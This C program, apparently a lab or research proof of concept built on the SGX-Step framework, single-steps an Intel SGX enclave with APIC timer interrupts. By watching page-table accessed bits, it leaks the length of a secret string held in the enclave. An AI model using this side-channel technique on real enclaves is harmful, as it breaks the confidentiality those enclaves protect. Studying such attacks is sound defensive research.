#include <sgx_urts.h>
#include "Enclave/encl_u.h"
#include <signal.h>
#include <sys/mman.h>
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <pthread.h>
#include "libsgxstep/apic.h"
#include "libsgxstep/pt.h"
#include "libsgxstep/sched.h"
#include "libsgxstep/enclave.h"
#include "libsgxstep/debug.h"
#include "libsgxstep/config.h"
#include "libsgxstep/idt.h"

sgx_enclave_id_t eid = 0;
uintptr_t baseAddress;

int encl_strlen = 0;
int nb_access = 0;

uint64_t *pte_secret_str = NULL;
int irq_cnt = 0, do_irq = 1, fault_cnt = 0;
uint64_t *pte_encl = NULL;
uint64_t *pmd_encl = NULL;
int stepFault = 1;

void *secret_str_address;



void aep_cb_func(void) {
	irq_cnt++;
	if (ACCESSED(*pte_secret_str)) {
		nb_access++;
	}

	*pte_secret_str = MARK_NOT_ACCESSED(*pte_secret_str);
		if ((irq_cnt > 100*500)) {
		do_irq = 0;
	}

	if (do_irq) {
	*pmd_encl = MARK_NOT_ACCESSED( *pmd_encl );
	apic_timer_irq( SGX_STEP_TIMER_INTERVAL );
	}
}
void attacker_config_runtime(void) {
	ASSERT( !claim_cpu(VICTIM_CPU) );
	ASSERT( !prepare_system_for_benchmark(PSTATE_PCT) );

	register_aep_cb(aep_cb_func);
	register_enclave_info();
	print_enclave_info();
}

void attacker_config_page_table(void) {
	ASSERT(pte_secret_str = remap_page_table_level( (void *) secret_str_address , PTE) );
	ASSERT(!mprotect((void *) secret_str_address, 4096, PROT_NONE));
	ASSERT( pmd_encl = remap_page_table_level( get_enclave_base(), PMD) );
}

void fault_handler(void *base_adrs) {
	if(base_adrs == secret_str_address && stepFault == 1) {
		stepFault = 0;
		ASSERT(!mprotect((void *)secret_str_address, 4096, PROT_READ | PROT_WRITE));
		return;
	}
}

int main( int argc, char **argv) {
	sgx_launch_token_t token = {0};
	int updated = 0;

	SGX_ASSERT(sgx_create_enclave("./Enclave/encl.so", 1, &token, &updated, &eid, NULL));

	baseAddress = (uintptr_t) get_enclave_base();
	register_fault_handler(fault_handler);
	secret_str_address = baseAddress + (69632/4096)*4096;

	
	
		attacker_config_runtime();
	attacker_config_page_table();

	idt_t idt = {0};
	map_idt(&idt);
	install_kernel_irq_handler(&idt, __ss_irq_handler, IRQ_VECTOR);
	apic_timer_oneshot(IRQ_VECTOR);

	SGX_ASSERT(do_strlen(eid, &encl_strlen, 1));
	printf("secret strlen = %d\n", nb_access-1);
	;
	apic_timer_deadline();
	SGX_ASSERT( sgx_destroy_enclave( eid ) );
	info("all is well; exiting..");
	return 0;
}